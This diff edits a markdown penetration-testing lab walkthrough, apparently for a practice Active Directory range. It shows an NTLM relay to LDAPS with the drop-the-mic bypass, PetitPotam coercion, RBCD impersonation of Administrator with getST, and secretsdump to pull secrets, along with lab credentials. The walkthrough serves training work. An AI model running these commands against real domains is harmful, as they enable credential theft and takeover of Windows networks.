@@ -93,29 +93,29 @@ If we specify a loot dir all the informations on the ldap are automatically dump
 ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
 ```
 
-## Drop the mic <a href="#coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic" id="coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic"></a>
+## Coerced auth smb + ntlmrelayx to ldaps with drop the mic
 
 Start the relay with remove mic to the ldaps of meereen.essos.local.
 
 ```bash
-ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --dele
+ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --delegate-access
 ```
 
 Run the coerce authentication on braavos (braavos is a windows server 2016 up to date so petitpotam unauthenticated will not work here)
 
 ```bash
-python3 coercer.py -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.1
+python3 PetitPotam.py -u khal.drogo -p horse 192.168.56.129 braavos.essos.local
 ```
 
 The attack worked we can now exploit braavos with RBCD
 
 ```bash
-getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/remove
+getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/removemiccomputer$:_53>W3){OkTY{ej'
 ```
 
 And use that ticket to retreive secrets
 
 ```bash
-export KRB5CCNAME=/workspace/Administrator.ccache
+export KRB5CCNAME=/home/pentester/Tools/Administrator.ccache
 secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
 ```
